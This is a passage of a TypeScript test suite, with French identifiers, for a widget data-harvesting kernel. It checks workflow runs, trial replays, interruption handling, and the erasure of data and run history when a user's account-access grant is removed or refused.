    expect((await readWidgetState(ctx.dossierWidgets, "daily")).statut).toBe("accord-requis");
    const home = await readHome(spacePaths(ctx.espace), ctx.dossierWidgets);
    const lu = home.widgets.find((w) => w.id === "daily")!;
    expect("donnees" in lu && lu.donnees).toBeNull(); // what donnees_widget would return
  });
});

describe("runHarvest, through the widget's workflow", () => {
  const sources = { compte: ["app.daily.dev"], publiques: ["127.0.0.1"] };
  const dataOf = (ctx: Context) => join(ctx.dossierWidgets, ctx.widget.id);
  const runOf = async (ctx: Context, id: string | undefined) => {
    expect(id).toBeTruthy();
    return (await readRun(dataOf(ctx), id!))!;
  };
  /** Replaces recolte.mjs with a workflow.json (and its files). */
  async function toWorkflow(ctx: Context, workflow: unknown, files: Record<string, string> = {}) {
    await rm(join(ctx.widget.dossier, "recolte.mjs"), { force: true });
    await writeFile(join(ctx.widget.dossier, "workflow.json"), typeof workflow === "string" ? workflow : JSON.stringify(workflow));
    for (const [name, text] of Object.entries(files)) await writeFile(join(ctx.widget.dossier, name), text);
  }
  const NEW = {
    version: 1,
    blocs: [
      { id: "liste", type: "code", parametres: { source: "liste.mjs" } },
      { id: "nouveaux", type: "liste.nouveaux", parametres: { cle: "id" } },
      { id: "sortie", type: "sortie", parametres: { vers: "widget" } },
    ],
    liens: [{ de: "liste", vers: "nouveaux" }, { de: "nouveaux", vers: "sortie" }],
  };
  /** An old run and a memory, to check that they leave with the data. */
  async function traces(ctx: Context) {
    const old: Execution = {
      version: 1, id: "2026-10-27T08-00-00-000Z", proprietaire: { type: "widget", id: ctx.widget.id }, declencheur: "planifiee",
      debut: "2026-10-27T08:00:00.000Z", fin: "2026-10-27T08:00:01.000Z", statut: "reussie", blocs: [],
    };
    await writeRun(dataOf(ctx), old);
    await writeMemory(dataOf(ctx), { nouveaux: { type: "liste.nouveaux", valeur: ["secret"] } });
  }

  it("a widget with only recolte.mjs and an account runs as before: same data, same log, implicit run recolte → output", async () => {
    const ctx = await prepare(
      "gmail",
      `export default async (w) => {
        const p = await w.lirePage("https://app.daily.dev/", { compte: true });
        w.journal("courriels lus");
        return { texte: p.texte, prec: w.precedent, cfg: w.config, quand: w.maintenant };
      };`,
      sources,
    );
    await writeData(ctx.dossierWidgets, "gmail", { ancien: true });
    await giveGrant(ctx.dossierWidgets, "gmail", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const bridge = readBridge();
    const r = await harvest(ctx, { pont: bridge });
    const expected = { texte: "articles", prec: { ancien: true }, cfg: { a: 1 }, quand: NOW.toISOString() };
    expect(r.etat).toMatchObject({ statut: "ok", derniereMaj: NOW.toISOString() });
    expect(r.donnees).toEqual(expected);
    expect(await readJson(join(ctx.dossierWidgets, "gmail", "donnees.json"))).toEqual(expected);
    const state = await readWidgetState(ctx.dossierWidgets, "gmail");
    expect(state.statut).toBe("ok");
    expect(state.journal).toContain("courriels lus");
    expect(readCalls(bridge)[0]!.args).toEqual(["https://app.daily.dev/", { profil: "perso", domaines: ["app.daily.dev"], adressesLocales: true }]);
    const e = await runOf(ctx, r.execution);
    expect(e).toMatchObject({ statut: "reussie", declencheur: "planifiee", proprietaire: { type: "widget", id: "gmail" }, debut: NOW.toISOString() });
    expect(e.blocs.map((b) => [b.id, b.type, b.statut])).toEqual([["recolte", "code", "reussi"], ["sortie", "sortie", "reussi"]]);
    expect(e.blocs[0]!.journal).toContain("courriels lus");
    // An error thrown by this widget stays its own: never marked as the kernel's.
    await writeFile(join(ctx.widget.dossier, "recolte.mjs"), `export default async () => { throw new Error("Délai dépassé"); };`);
    const failure = await harvest(ctx);
    expect(failure.etat).toMatchObject({ statut: "erreur", erreur: "Délai dépassé" });
    expect(failure.etat.erreurNoyau).toBeUndefined();
    expect(await readJson(join(ctx.dossierWidgets, "gmail", "donnees.json"))).toEqual(expected);
    expect((await runOf(ctx, failure.execution)).statut).toBe("echouee");
  });

  it("a workflow widget writes data, run and memory; the next harvest receives the memory", async () => {
    const ctx = await prepare("flux", "");
    await toWorkflow(ctx, NEW, { "liste.mjs": `export default async () => [{ id: 1 }, { id: 2 }];` });
    const r1 = await harvest(ctx);
    expect(r1.etat.statut).toBe("ok");
    expect(r1.donnees).toEqual([{ id: 1 }, { id: 2 }]);
    expect(await readJson(join(ctx.dossierWidgets, "flux", "donnees.json"))).toEqual([{ id: 1 }, { id: 2 }]);
    expect((await readMemory(dataOf(ctx))).nouveaux?.type).toBe("liste.nouveaux");
    const e = await runOf(ctx, r1.execution);
    expect(e.blocs.map((b) => [b.id, b.statut, b.elements])).toEqual([["liste", "reussi", 2], ["nouveaux", "reussi", 2], ["sortie", "reussi", 2]]);
    await writeFile(join(ctx.widget.dossier, "liste.mjs"), `export default async () => [{ id: 2 }, { id: 3 }];`);
    const r2 = await harvest(ctx);
    expect(r2.donnees).toEqual([{ id: 3 }]);
  });

  it("a run's memory is written under the widget's memory lock (the builder's erase lock)", async () => {
    const ctx = await prepare("flux", "");
    await toWorkflow(ctx, NEW, { "liste.mjs": `export default async () => [{ id: 1 }];` });
    let release!: () => void;
    const held = withMemory(dataOf(ctx), () => new Promise<void>((r) => (release = r)));
    let finished = false;
    const r = harvest(ctx).then((x) => ((finished = true), x));
    const data = join(dataOf(ctx), "donnees.json");
    for (let i = 0; i < 200 && !existsSync(data); i++) await new Promise((t) => setTimeout(t, 25));
    expect(existsSync(data)).toBe(true);
    await new Promise((t) => setTimeout(t, 100));
    expect(finished).toBe(false);
    expect(existsSync(join(dataOf(ctx), "memoire.json"))).toBe(false);
    release();
    await held;
    expect((await r).etat.statut).toBe("ok");
    expect((await readMemory(dataOf(ctx))).nouveaux?.type).toBe("liste.nouveaux");
  });

  it("an invalid workflow.json: error state « Workflow invalide : … » marked erreurNoyau, data kept, no container launched, failed run written", async () => {
    for (const workflow of ['{"version":1,"blocs":[', { version: 1, blocs: [{ id: "x", type: "inconnu" }] }]) {
      const ctx = await prepare("casse", "");
      await toWorkflow(ctx, workflow);
      await writeData(ctx.dossierWidgets, "casse", { ancien: true });
      const r = await harvest(ctx);
      expect(r.etat.statut).toBe("erreur");
      expect(r.etat.erreur).toMatch(/^Workflow invalide : /);
      expect(r.etat.erreurNoyau).toBe(true);
      expect(kernelError(r.etat.erreur!)).toBe(true);
      expect(ctx.commandes).toHaveLength(0);
      expect(await readJson(join(ctx.dossierWidgets, "casse", "donnees.json"))).toEqual({ ancien: true });
      const e = await runOf(ctx, r.execution);
      expect(e).toMatchObject({ statut: "echouee", erreurNoyau: true, blocs: [] });
      expect(e.erreur).toBe(r.etat.erreur);
    }
  });

  it("the workflow is validated according to the widget: budgetSecondes 600 refused without a maximum duration, accepted with dureeMaxMinutes 30", async () => {
    const LONG = {
      version: 1,
      blocs: [
        { id: "liste", type: "code", parametres: { source: "liste.mjs" } },
        { id: "page", type: "source.page", parametres: { url: "https://app.daily.dev/", parElement: true, budgetSecondes: 600 } },
        { id: "sortie", type: "sortie", parametres: { vers: "widget" } },
      ],
      liens: [{ de: "liste", vers: "page" }, { de: "page", vers: "sortie" }],
    };
    const files = { "liste.mjs": "export default () => [{ id: 1 }];" };
    const short = await prepare("court", "");
    await toWorkflow(short, LONG, files);
    const deny = await harvest(short, { pont: readBridge() });
    expect(deny.etat.erreur).toBe("Workflow invalide : page.budgetSecondes : 170 au plus");
    expect(short.commandes).toHaveLength(0);

    const long = await prepare("long", "");
    long.widget.declaration.recolte = { minutes: 60, dureeMaxMinutes: 30 };
    await toWorkflow(long, LONG, files);
    const r = await harvest(long, { pont: readBridge() });
    expect(long.commandes).toHaveLength(1);
    expect(r.etat.statut).toBe("ok");
  });

  it("grant removed during the run: no data, no run, no memory on disk at the end", async () => {
    const ctx = await prepare("daily", "", sources);
    await toWorkflow(ctx, NEW, {
      "liste.mjs": `export default async (e, w) => [{ id: (await w.lirePage("https://app.daily.dev/", { compte: true })).texte }];`,
    });
    await writeData(ctx.dossierWidgets, "daily", { ancien: true });
    await giveGrant(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const bridge = readBridge();
    const read = bridge.lirePageInvisible!.bind(bridge);
    // What refuserAccord does, during the read: the page read still reaches the widget.
    bridge.lirePageInvisible = async (...a: Parameters<typeof read>) => {
      await removeGrant(ctx.dossierWidgets, "daily");
      await deleteData(ctx.dossierWidgets, "daily");
      return read(...a);
    };
    const r = await harvest(ctx, { pont: bridge });
    expect(readCalls(bridge)).toHaveLength(1);
    expect(r.etat).toMatchObject({ statut: "accord-requis", erreurNoyau: true });
    expect(r.donnees).toBeUndefined();
    expect(r.execution).toBeUndefined();
    expect(existsSync(join(ctx.dossierWidgets, "daily", "donnees.json"))).toBe(false);
    expect(existsSync(join(ctx.dossierWidgets, "daily", "memoire.json"))).toBe(false);
    expect(await listRuns(dataOf(ctx))).toEqual([]);
    expect((await readWidgetState(ctx.dossierWidgets, "daily")).statut).toBe("accord-requis");
  });

  it("profile refused: data, runs and memory erased", async () => {
    const ctx = await prepare("daily", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true });`, sources);
    await writeData(ctx.dossierWidgets, "daily", { secret: "du compte" });
    await traces(ctx);
    await giveGrant(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "prive" });
    const r = await harvest(ctx, { pont: readBridge(["prive"]) });
    expect(r.etat).toMatchObject({ statut: "accord-requis", erreur: PROFILE_DENIED, erreurNoyau: true });
    expect(await readGrants(ctx.dossierWidgets)).toEqual({});
    expect(existsSync(join(ctx.dossierWidgets, "daily", "donnees.json"))).toBe(false);
    expect(existsSync(join(ctx.dossierWidgets, "daily", "memoire.json"))).toBe(false);
    expect(await listRuns(dataOf(ctx))).toEqual([]);
  });

  it("stale grant (declaration changed): runs and memory erased along with the data", async () => {
    const ctx = await prepare("daily", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true });`, sources);
    await writeData(ctx.dossierWidgets, "daily", { secret: "du compte" });
    await traces(ctx);
    await giveGrant(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev", "ancien.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const r = await harvest(ctx);
    expect(r.etat.statut).toBe("accord-requis");
    expect(existsSync(join(ctx.dossierWidgets, "daily", "donnees.json"))).toBe(false);
    expect(existsSync(join(ctx.dossierWidgets, "daily", "memoire.json"))).toBe(false);
    // Only the « accord requis » run of this time remains.
    expect((await listRuns(dataOf(ctx))).map((e) => [e.id, e.statut])).toEqual([[r.execution, "accord-requis"]]);
  });

  it("without a grant: accord-requis run, no block launched", async () => {
    const ctx = await prepare("daily", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true });`, sources);
    const r = await harvest(ctx);
    expect(r.etat).toMatchObject({ statut: "accord-requis", erreur: "Accord requis pour lire avec ton compte : app.daily.dev", erreurNoyau: true });
    expect(ctx.commandes).toHaveLength(0);
    const e = await runOf(ctx, r.execution);
    expect(e).toMatchObject({ statut: "accord-requis", erreurNoyau: true, erreur: r.etat.erreur });
    expect(e.blocs.map((b) => [b.id, b.statut])).toEqual([["recolte", "pas-lance"], ["sortie", "pas-lance"]]);
  });

  it("without a grant, again: no new accord-requis run, the last one stands in", async () => {
    const ctx = await prepare("daily", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true });`, sources);
    const first = await harvest(ctx);
    // An hour later: without the rule, a second run (other id) would be written.
    const later = () => new Date(NOW.getTime() + 3_600_000);
    const second = await runHarvest({ ...optionsOf(ctx), horloge: later });
    expect(second.etat.statut).toBe("accord-requis");
    expect(second.execution).toBe(first.execution);
    expect((await listRuns(dataOf(ctx))).map((e) => e.statut)).toEqual(["accord-requis"]);
  });

  it("the run carries the requested trigger", async () => {
    const ctx = await prepare("meteo", `export default async () => 1;`);
    const r = await runHarvest({ ...optionsOf(ctx), declencheur: "agent" });
    expect((await runOf(ctx, r.execution)).declencheur).toBe("agent");
    const m = await runHarvest({ ...optionsOf(ctx), declencheur: "manuelle" });
    expect((await runOf(ctx, m.execution)).declencheur).toBe("manuelle");
  });

  it("interrupted at the end: interrupted run", async () => {
    const ctx = await prepare("lent", `export default () => new Promise(() => {});`);
    const r = await runHarvest({ ...optionsOf(ctx), delaiMs: 300, interrompue: () => true });
    const e = await runOf(ctx, r.execution);
    // The message is the kernel's (not « Délai dépassé »); the started block is interrupted, the output never launched.
    expect(e).toMatchObject({ statut: "interrompue", erreur: "Interrompue : WebAiOs s'est arrêté", erreurNoyau: true });
    expect(e.blocs.map((b) => [b.id, b.statut])).toEqual([["recolte", "interrompu"], ["sortie", "pas-lance"]]);
    expect(kernelError(e.erreur!)).toBe(true);
  });
});

describe("runAttempt", () => {
  const sources = { compte: ["app.daily.dev"], publiques: ["127.0.0.1"] };
  const dataOf = (ctx: Context) => join(ctx.dossierWidgets, ctx.widget.id);
  async function toWorkflow(ctx: Context, workflow: unknown, files: Record<string, string> = {}) {
    await rm(join(ctx.widget.dossier, "recolte.mjs"), { force: true });
    await writeFile(join(ctx.widget.dossier, "workflow.json"), JSON.stringify(workflow));
    for (const [name, text] of Object.entries(files)) await writeFile(join(ctx.widget.dossier, name), text);
  }
  const NEW = {
    version: 1,
    blocs: [
      { id: "liste", type: "code", parametres: { source: "liste.mjs" } },
      { id: "nouveaux", type: "liste.nouveaux", parametres: { cle: "id" } },
      { id: "sortie", type: "sortie", parametres: { vers: "widget" } },
    ],
    liens: [{ de: "liste", vers: "nouveaux" }, { de: "nouveaux", vers: "sortie" }],
  };
  /** Content and modification date of the files kept outside the space (absent: null). */
  const snapshot = async (ctx: Context) => {
    const r: Record<string, { texte: string; mtime: number } | null> = {};
    for (const name of ["donnees.json", "memoire.json", "etat.json"]) {
      const path = join(dataOf(ctx), name);
      r[name] = existsSync(path) ? { texte: await readFile(path, "utf8"), mtime: (await stat(path)).mtimeMs } : null;
    }
    return r;
  };
  const attempt = (ctx: Context, origin: string, start: string, o: Partial<Parameters<typeof runAttempt>[0]> = {}) =>
    runAttempt({ ...optionsOf(ctx), origine: origin, depart: start, ...o });

  it("a trial writes a -essai run with depart and origine, and touches neither data, memory nor state", async () => {
    const ctx = await prepare("flux", "");
    await toWorkflow(ctx, NEW, { "liste.mjs": `export default async () => [{ id: 1 }, { id: 2 }];` });
    const real = await runHarvest(optionsOf(ctx));
    expect(real.etat.statut).toBe("ok");
    expect((await readMemory(dataOf(ctx))).nouveaux).toBeDefined();
    const before = await snapshot(ctx);
    expect(Object.values(before).every((f) => f !== null)).toBe(true);
    // The list is not rerun: its output is taken from the original run.
    await writeFile(join(ctx.widget.dossier, "liste.mjs"), `export default async () => { throw new Error("relancée"); };`);
    const traces: unknown[] = [];
    const r = await attempt(ctx, real.execution!, "nouveaux", { surTrace: (t) => traces.push(t) });
    expect(r).toEqual({ ok: true, execution: attemptId(NOW.toISOString()), statut: "reussie" });
    const e = (await readRun(dataOf(ctx), (r as { execution: string }).execution))!;
    expect(e).toMatchObject({ declencheur: "rejeu", essai: { depart: "nouveaux", origine: real.execution }, statut: "reussie" });
    expect(e.blocs.map((b) => [b.id, b.statut, b.elements])).toEqual([["liste", "repris", 2], ["nouveaux", "reussi", 2], ["sortie", "reussi", 2]]);
    expect(traces).toEqual([
      { bloc: "nouveaux", etape: "debut" },
      { bloc: "nouveaux", etape: "fin", statut: "reussi", elements: 2 },
      { bloc: "sortie", etape: "debut" },
      { bloc: "sortie", etape: "fin", statut: "reussi", elements: 2 },
    ]);
    expect(await snapshot(ctx)).toEqual(before);
    // The real run is still there, next to the trial.
    expect((await listRuns(dataOf(ctx))).map((x) => x.id).sort()).toEqual([real.execution, e.id].sort());
  });

  it("rejouer twice from the same block: the second trial starts from the first and takes the outputs of the real run", async () => {
    const ctx = await prepare("flux", "");
    await toWorkflow(ctx, NEW, { "liste.mjs": `export default async () => [{ id: 1 }, { id: 2 }];` });
    const real = await runHarvest(optionsOf(ctx));
    await writeFile(join(ctx.widget.dossier, "liste.mjs"), `export default async () => { throw new Error("relancée"); };`);
    const first = await attempt(ctx, real.execution!, "nouveaux");
    if (!first.ok) throw new Error(first.erreur);
    const later = new Date(NOW.getTime() + 60_000);
    const second = await attempt(ctx, first.execution, "nouveaux", { horloge: () => later });
    expect(second).toEqual({ ok: true, execution: attemptId(later.toISOString()), statut: "reussie" });
    const e = (await readRun(dataOf(ctx), attemptId(later.toISOString())))!;
    // The named origin is the one the reused output comes from: the real run.
    expect(e.essai).toEqual({ depart: "nouveaux", origine: real.execution });
    expect(e.blocs.map((b) => [b.id, b.statut, b.elements])).toEqual([["liste", "repris", 2], ["nouveaux", "reussi", 2], ["sortie", "reussi", 2]]);
    // Real run pruned: the refusal stays that of a missing output.
    await rm(join(dataOf(ctx), "executions", `${real.execution}.json`));
    expect(await attempt(ctx, first.execution, "nouveaux", { horloge: () => new Date(later.getTime() + 60_000) })).toEqual({
      ok: false, erreur: "Rejeu impossible : la sortie de « liste » manque dans cette exécution",
    });
  });

  it("a failing trial writes no error in the widget's state", async () => {
    const ctx = await prepare("flux", "");
    await toWorkflow(ctx, NEW, { "liste.mjs": `export default async () => [{ id: 1 }];` });
    const real = await runHarvest(optionsOf(ctx));
    const before = await snapshot(ctx);
    await writeFile(join(ctx.widget.dossier, "liste.mjs"), `export default async () => { throw new Error("boum"); };`);
    const r = await attempt(ctx, real.execution!, "liste");
    expect(r).toMatchObject({ ok: true, statut: "echouee" });
    expect(await snapshot(ctx)).toEqual(before);
    const state = await readWidgetState(ctx.dossierWidgets, "flux");
    expect(state.statut).toBe("ok");
    expect(state.erreur).toBeUndefined();
  });

  it("trial of a widget with an account without a grant: refused with the grant message, no container, nothing written", async () => {
    const ctx = await prepare("daily", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true });`, sources);
    const r = await attempt(ctx, "2026-10-27T08-00-00-000Z", "recolte");
    expect(r).toEqual({ ok: false, erreur: "Accord requis pour lire avec ton compte : app.daily.dev" });
    expect(ctx.commandes).toHaveLength(0);
    expect(existsSync(dataOf(ctx))).toBe(false);
  });

  it("grant removed during the trial: no run on disk", async () => {
    const ctx = await prepare(
      "daily",
      `export default async (w) => { const p = await w.lirePage("https://app.daily.dev/", { compte: true }); await w.kev("x", {}); return p.texte; };`,
      sources,
    );
    await giveGrant(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const fake = { kev: async () => ({}), gemma: async () => "" };
    const real = await runHarvest({ ...optionsOf(ctx), ia: fake });
    expect(real.etat.statut).toBe("ok");
    // What refuserAccord does, during the trial.
    const remove = {
      kev: async () => {
        await removeGrant(ctx.dossierWidgets, "daily");
        await deleteData(ctx.dossierWidgets, "daily");
        return {};
      },
      gemma: async () => "",
    };
    const r = await attempt(ctx, real.execution!, "recolte", { ia: remove });
    expect(r).toEqual({ ok: false, erreur: "Accord requis pour lire avec ton compte : app.daily.dev" });
    expect(await listRuns(dataOf(ctx))).toEqual([]);
    expect(existsSync(join(dataOf(ctx), "donnees.json"))).toBe(false);
  });

  it("trial refused by the replay plan: exact message, no container launched", async () => {
    const ctx = await prepare("flux", "");
    await toWorkflow(ctx, NEW, { "liste.mjs": `export default async () => [{ id: 1 }];` });
    const real = await runHarvest(optionsOf(ctx));
    const launched = ctx.commandes.length;
    const before = await snapshot(ctx);
    expect(await attempt(ctx, real.execution!, "absent")).toEqual({ ok: false, erreur: "Rejeu impossible : le bloc « absent » n'est pas dans le workflow" });
    expect(await attempt(ctx, "2020-01-01T00-00-00-000Z", "liste")).toEqual({ ok: false, erreur: "Rejeu impossible : exécution introuvable" });
    expect(ctx.commandes).toHaveLength(launched);
    expect(await snapshot(ctx)).toEqual(before);
    expect(await listRuns(dataOf(ctx))).toHaveLength(1);
  });

  it("trial whose reused outputs and previous one exceed 4 MB: refused, no container, nothing written", async () => {
    const ctx = await prepare("gros", "");
    const upstream = Array.from({ length: 10 }, (_, i) => `a${i}`);
    await toWorkflow(ctx, {
      version: 1,
      blocs: [
        ...upstream.map((id) => ({ id, type: "code", parametres: { source: "a.mjs" } })),
        { id: "tout", type: "code", parametres: { source: "a.mjs" } },
        { id: "sortie", type: "sortie", parametres: { vers: "widget" } },
      ],
      liens: [...upstream.map((from) => ({ de: from, vers: "tout" })), { de: "tout", vers: "sortie" }],
    }, { "a.mjs": `export default async () => 1;` });
    await writeData(ctx.dossierWidgets, "gros", "x".repeat(1_900_000));
    const origin: Execution = {
      version: 1, id: "2026-10-27T08-00-00-000Z", proprietaire: { type: "widget", id: "gros" }, declencheur: "planifiee",
      debut: "2026-10-27T08:00:00.000Z", fin: "2026-10-27T08:00:01.000Z", statut: "reussie",
      blocs: upstream.map((id) => ({ id, type: "code", statut: "reussi" as const, debut: null, fin: null, elements: null, sortie: "y".repeat(240_000), journal: [] })),
    };
    await writeRun(dataOf(ctx), origin);
    const r = await attempt(ctx, origin.id, "tout");
    expect(r).toEqual({ ok: false, erreur: "Rejeu impossible : les sorties à reprendre dépassent 4 Mo" });
    expect(ctx.commandes).toHaveLength(0);
    expect((await listRuns(dataOf(ctx))).map((e) => e.id)).toEqual([origin.id]);
  });

  it("a widget without workflow.json (recolte.mjs alone): rejouer from the output takes the recolte output", async () => {
    const ctx = await prepare("gmail", `export default async (w) => ({ texte: (await w.lirePage("https://app.daily.dev/", { compte: true })).texte });`, sources);
    await giveGrant(ctx.dossierWidgets, "gmail", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const bridge = readBridge();
    const real = await runHarvest({ ...optionsOf(ctx), pont: bridge });
    expect(real.etat.statut).toBe("ok");
    const before = await snapshot(ctx);
    await writeFile(join(ctx.widget.dossier, "recolte.mjs"), `export default async () => { throw new Error("relancée"); };`);
    const r = await attempt(ctx, real.execution!, "sortie", { pont: bridge });
    expect(r).toMatchObject({ ok: true, statut: "reussie" });
    const e = (await readRun(dataOf(ctx), (r as { execution: string }).execution))!;
    expect(e.blocs.map((b) => [b.id, b.statut])).toEqual([["recolte", "repris"], ["sortie", "reussi"]]);
    expect(readCalls(bridge)).toHaveLength(1);
    expect(await snapshot(ctx)).toEqual(before);
    expect(existsSync(join(ctx.widget.dossier, "workflow.json"))).toBe(false);
  });

  it("stale grant at the start of a trial: grant removed, data erased, state accord-requis reported, no container", async () => {
    const ctx = await prepare("daily", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true });`, sources);
    await writeData(ctx.dossierWidgets, "daily", { secret: "du compte" });
    const state = { statut: "ok" as const, derniereMaj: "2026-10-27T08:00:00.000Z", derniereTentative: "2026-10-27T08:00:00.000Z" };
    await writeWidgetState(ctx.dossierWidgets, "daily", state);
    await giveGrant(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev", "ancien.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const onChange = vi.fn();
    const r = await attempt(ctx, "2026-10-27T08-00-00-000Z", "recolte", { surChange: onChange });
    expect(r).toEqual({ ok: false, erreur: "Accord requis pour lire avec ton compte : app.daily.dev" });
    expect(ctx.commandes).toHaveLength(0);
    expect(await readGrants(ctx.dossierWidgets)).toEqual({});
    expect(existsSync(join(dataOf(ctx), "donnees.json"))).toBe(false);
    expect(await readWidgetState(ctx.dossierWidgets, "daily")).toEqual({
      ...state,
      statut: "accord-requis",
      erreur: "Accord requis pour lire avec ton compte : app.daily.dev",
      erreurNoyau: true,
    });
    expect(onChange).toHaveBeenCalled();
  });

  it("profile refused during the trial: no run, grant removed, state accord-requis", async () => {
    const ctx = await prepare("daily", `export default async (w) => (await w.lirePage("https://app.daily.dev/", { compte: true })).texte;`, sources);
    await giveGrant(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const real = await runHarvest(optionsOf(ctx));
    expect(real.etat.statut).toBe("ok");
    await giveGrant(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "prive" });
    const onChange = vi.fn();
    const r = await attempt(ctx, real.execution!, "recolte", { pont: readBridge(["prive"]), surChange: onChange });
    expect(r).toEqual({ ok: false, erreur: PROFILE_DENIED });
    expect(await listRuns(dataOf(ctx))).toEqual([]);
    expect(await readGrants(ctx.dossierWidgets)).toEqual({});
    expect(existsSync(join(dataOf(ctx), "donnees.json"))).toBe(false);
    expect(await readWidgetState(ctx.dossierWidgets, "daily")).toMatchObject({
      statut: "accord-requis",
      erreur: PROFILE_DENIED,
      erreurNoyau: true,
      derniereMaj: real.etat.derniereMaj,
      derniereTentative: real.etat.derniereTentative,
    });
    expect(onChange).toHaveBeenCalled();
  });

  it("interrupted during the trial: -essai run interrupted, neither data, memory nor state touched", async () => {
    const ctx = await prepare("lent", `export default () => new Promise(() => {});`);
    await writeData(ctx.dossierWidgets, "lent", { ancien: true });
    await writeWidgetState(ctx.dossierWidgets, "lent", { statut: "ok", derniereMaj: "2026-10-27T08:00:00.000Z", derniereTentative: "2026-10-27T08:00:00.000Z" });
    const origin: Execution = {
      version: 1, id: "2026-10-27T08-00-00-000Z", proprietaire: { type: "widget", id: "lent" }, declencheur: "planifiee",
      debut: "2026-10-27T08:00:00.000Z", fin: "2026-10-27T08:00:01.000Z", statut: "reussie", blocs: [],
    };
    await writeRun(dataOf(ctx), origin);
    const before = await snapshot(ctx);
    const r = await attempt(ctx, origin.id, "recolte", { delaiMs: 300, interrompue: () => true });
    expect(r).toEqual({ ok: true, execution: attemptId(NOW.toISOString()), statut: "interrompue" });
    const e = (await readRun(dataOf(ctx), attemptId(NOW.toISOString())))!;
    expect(e).toMatchObject({ statut: "interrompue", erreur: "Interrompue : WebAiOs s'est arrêté", erreurNoyau: true });
    expect(e.blocs.map((b) => [b.id, b.statut])).toEqual([["recolte", "interrompu"], ["sortie", "pas-lance"]]);
    expect(await snapshot(ctx)).toEqual(before);
  });

  it("without a grant: a more recent trial does not prevent the last accord-requis run from standing in", async () => {
    const ctx = await prepare("daily", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true });`, sources);
    const first = await runHarvest(optionsOf(ctx));
    expect(first.etat.statut).toBe("accord-requis");
    const attemptWritten: Execution = {
      version: 1, id: "2026-10-28T11-00-00-000Z-essai", proprietaire: { type: "widget", id: "daily" }, declencheur: "rejeu",
      essai: { depart: "recolte", origine: first.execution! },
      debut: "2026-10-28T11:00:00.000Z", fin: "2026-10-28T11:00:01.000Z", statut: "echouee", blocs: [],
    };
    await writeRun(dataOf(ctx), attemptWritten);
    const later = () => new Date(NOW.getTime() + 2 * 3_600_000);
    const second = await runHarvest({ ...optionsOf(ctx), horloge: later });
    expect(second.execution).toBe(first.execution);
    expect((await listRuns(dataOf(ctx))).filter((e) => !e.essai)).toHaveLength(1);
  });
});

describe("runHarvest, watch (publications as it goes, memory kept, novelties)", () => {
  const dataOf = (ctx: Context) => join(ctx.dossierWidgets, ctx.widget.id);
  const dataFile = (ctx: Context) => join(dataOf(ctx), "donnees.json");
  const memoryFile = (ctx: Context) => join(dataOf(ctx), "memoire.json");
  /** list (code) → record (source.recuperer per element) → output. */
  const watch = (o: { auFilDeLEau?: boolean } = {}) => ({
    version: 1,
    blocs: [
      { id: "liste", type: "code", parametres: { source: "liste.mjs" } },
      { id: "fiche", type: "source.recuperer", parametres: { url: "{url}", parElement: true } },
      { id: "sortie", type: "sortie", parametres: { vers: "widget", ...(o.auFilDeLEau ? { auFilDeLEau: true } : {}) } },
    ],
    liens: [{ de: "liste", vers: "fiche" }, { de: "fiche", vers: "sortie" }],
  });
  async function inWatch(ctx: Context, o: { auFilDeLEau?: boolean; dureeMaxMinutes?: number } = {}) {
    await rm(join(ctx.widget.dossier, "recolte.mjs"), { force: true });
    await writeFile(join(ctx.widget.dossier, "workflow.json"), JSON.stringify(watch(o)));
    await writeFile(join(ctx.widget.dossier, "liste.mjs"), "export default () => [];");
    if (o.dureeMaxMinutes !== undefined) ctx.widget.declaration.recolte = { minutes: 60, dureeMaxMinutes: o.dureeMaxMinutes };
  }

  /**
   * A fake container that writes its lines one by one; a function (possibly async) is called instead
   * of a line. `recu`: what the kernel writes to it; `bloque`: it never exits on its own (only killed).
   */
  const launcherSteps = (ctx: Context, step: unknown[], o: { recu?: string[]; bloque?: boolean } = {}): ProcessLauncher => (cmd, args) => {
    ctx.commandes.push([cmd, ...args]);
    const stdout = new PassThrough();
    const stderr = new PassThrough();
    const stdin = new PassThrough();
    stdin.on("data", (d: Buffer) => o.recu?.push(d.toString()));
    let kill = () => {};
    const end = new Promise<number | null>((ok) => {
      kill = () => ok(null);
      void (async () => {
        for (const p of step) {
          await new Promise((r) => setImmediate(r));
          if (typeof p === "function") await p();
          else stdout.write(typeof p === "string" ? p : JSON.stringify(p) + "\n");
        }
        await new Promise((r) => setImmediate(r));
        if (o.bloque) return;
        stdout.end();
        stderr.end();
        setImmediate(() => ok(0));
      })().catch(() => {
        // A probe failed: the container stops right away (the test fails on what the probe did not see).
        stdout.end();
        stderr.end();
        ok(1);
      });
    });
    return { stdin, stdout, stderr, tuer: () => kill(), fin: end };
  };

  /** A clock that the steps make advance. */
  const movableClock = () => {
    let t = NOW.getTime();
    return { horloge: () => new Date(t), avancer: (ms: number) => () => void (t += ms) };
  };
  const blockStart = (id: string) => ({ t: "bloc", id, etape: "debut" });
  const blockEnd = (id: string, output: unknown) => ({ t: "bloc", id, etape: "fin", statut: "reussi", sortie: output });
  const pub = (data: unknown, done: number, total: number) => ({ t: "publication", donnees: data, faits: done, total });
  const mem = (value: unknown) => ({ t: "memoire", memoire: { liste: { type: "code", valeur: value } } });
  const A1 = { url: "https://a.example/1" };
  const A2 = { url: "https://a.example/2" };
  const A3 = { url: "https://a.example/3" };
  /** The start of a watch() run up to the opening of the chain (record). */
